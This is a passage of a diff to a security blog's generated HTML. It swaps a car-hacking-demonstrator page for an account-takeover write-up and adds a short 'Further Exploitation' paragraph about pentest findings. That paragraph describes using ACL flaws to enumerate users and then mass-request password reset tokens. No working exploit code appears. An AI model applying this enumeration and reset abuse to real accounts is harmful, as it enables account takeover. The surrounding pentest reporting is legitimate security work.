+</span></span><span class="line"><span class="cl">        <span class="k">break</span>
+</span></span></code></pre></div>
 
-
-<h2 class="relative group"><i class="fa-solid fa-list-ul text-primary-400"></i> Conclusion 
-    <div id="i-classfa-solid-fa-list-ul-text-primary-400i-conclusion" class="anchor"></div>
+<h3 class="relative group">Further Exploitation 
+    <div id="further-exploitation" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#i-classfa-solid-fa-list-ul-text-primary-400i-conclusion" aria-label="Anchor">#</a>
+            style="text-decoration-line: none !important;" href="#further-exploitation" aria-label="Anchor">#</a>
     </span>        
     
-</h2>
-<p>Our car hacking demonstrator stands as a testament to the critical role of practical training in the realm of automotive cybersecurity. By emulating a real car&rsquo;s control systems and leveraging authentic CAN communication, the platform provides a vivid, real-time insight into the mechanics of cyberattacks and the corresponding defensive strategies. We are confident that tools like this are essential for equipping security teams with the knowledge and skills needed to protect the vehicles of tomorrow.</p>
-
-<figure>
-      <img class="my-0 rounded-md" src="/images/posts/demonstrator/v1/thankyou.jpeg" alt="Description of the image" />
-  
-  
-  </figure>
+</h3>
+<p>During the penetration test, we discovered multiple bugs due to <span class="text-primary-400">Access Control List (ACL) issues that allowed us to enumerate users</span>. This enumeration enabled us to trigger password resets for users, further exacerbating the vulnerability. <span class="text-primary-400">By identifying valid usernames, we could systematically request reset tokens, making the attack even more efficient</span>.</p>
 
           
           
@@ -1130,120 +1202,6 @@ simulate attacks and visually observe their consequences in real time</span>.</p
   
   
 
-  <a href="/posts/intro-to-cache-poisoning/" class="min-w-full">
-    
-    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
-        
-        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/posts/intro-to-cache-poisoning/feature.png);"></div>
-        
-      
-
-      <div class="px-6 py-4">
-
-        
-        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
-          href="/posts/intro-to-cache-poisoning/">Introduction to Cache Poisoning Attacks</div>
-        
-
-        <div class="text-sm text-neutral-500 dark:text-neutral-400">
-          
-
-
-
-
-
-
-
-
-
-
-
-  
-
-
-
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-
-<div class="flex flex-row flex-wrap items-center">
-  
-  
-  <time datetime="2025-02-19T00:00:00&#43;00:00">19 February 2025</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">4 mins</span>
-  
-
-  
-  
-</div>
-
-
-
-
-
-<div class="flex flex-row flex-wrap items-center">
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/cache-poisoning/&#34;,'_self');return false;">
-    <span class="flex" style="cursor: pointer;">
-  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Cache Poisoning
-  </span>
-</span>
-  </span>
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/guide/&#34;,'_self');return false;">
-    <span class="flex" style="cursor: pointer;">
-  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Guide
-  </span>
-</span>
-  </span>
-  
-  
-  
-  
-</div>
-
-
-
-
-        </div>
-
-        
-      </div>
-      <div class="px-6 pt-4 pb-2">
-
-      </div>
-    </div>
-  </a>
-
-  
-  
-
   <a href="/posts/reflected-xss-to-ato/" class="min-w-full">
     
     <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
@@ -1364,6 +1322,102 @@ simulate attacks and visually observe their consequences in real time</span>.</p
   </a>
 
   
+  
+
+  <a href="/ctfs/acectf/" class="min-w-full">
+    
+    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
+        
+        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/ctfs/acectf/feature.png);"></div>
+        
+      
+
+      <div class="px-6 py-4">
+
+        
+        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
+          href="/ctfs/acectf/">ACECTF</div>
+        
+
+        <div class="text-sm text-neutral-500 dark:text-neutral-400">
+          
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  <time datetime="2025-02-27T00:00:00&#43;00:00">27 February 2025</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">11 mins</span>
+  
+
+  
+  
+</div>
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+</div>
+
+
+
+
+        </div>
+
+        
+      </div>
+      <div class="px-6 pt-4 pb-2">
+
+      </div>
+    </div>
+  </a>
+
+  
 </section>
 
   
@@ -1377,8 +1431,8 @@ simulate attacks and visually observe their consequences in real time</span>.</p
           
         
       <script>
-        var oid = "views_posts\/Demonstrator V1\/index.md"
-        var oid_likes = "likes_posts\/Demonstrator V1\/index.md"
+        var oid = "views_posts\/ATO via flawed password reset\/index.md"
+        var oid_likes = "likes_posts\/ATO via flawed password reset\/index.md"
       </script>
       
       
@@ -1398,7 +1452,7 @@ simulate attacks and visually observe their consequences in real time</span>.</p
       <div class="flex justify-between pt-3">
         <span>
           
-            <a class="flex group mr-3" href="/posts/cors-to-ato/">
+            <a class="flex group mr-3" href="/posts/demonstrator-v1/">
               <span
                 class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                 >&larr;</span
@@ -1410,11 +1464,11 @@ simulate attacks and visually observe their consequences in real time</span>.</p
               <span class="flex flex-col">
                 <span
                   class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >CORS Misconfiguration to Account Takeover</span
+                  >Inside Our Car Hacking Demonstrator</span
                 >
                 <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                   
-                    <time datetime="2025-02-20T00:00:00&#43;00:00">20 February 2025</time>
+                    <time datetime="2025-02-21T00:00:00&#43;00:00">21 February 2025</time>
                   
                 </span>
               </span>
@@ -1422,28 +1476,6 @@ simulate attacks and visually observe their consequences in real time</span>.</p
           
         </span>
         <span>
-          
-            <a class="flex text-right group ml-3" href="/posts/ato-via-flawed-password-reset/">
-              <span class="flex flex-col">
-                <span
-                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >Account Takeover via flawed reset mechanism</span
-                >
-                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
-                  
-                    <time datetime="2025-03-09T00:00:00&#43;00:00">9 March 2025</time>
-                  
-                </span>
-              </span>
-              <span
-                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
-                >&rarr;</span
-              >
-              <span
-                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
-                >&larr;</span
-              >
-            </a>
           
         </span>
       </div>
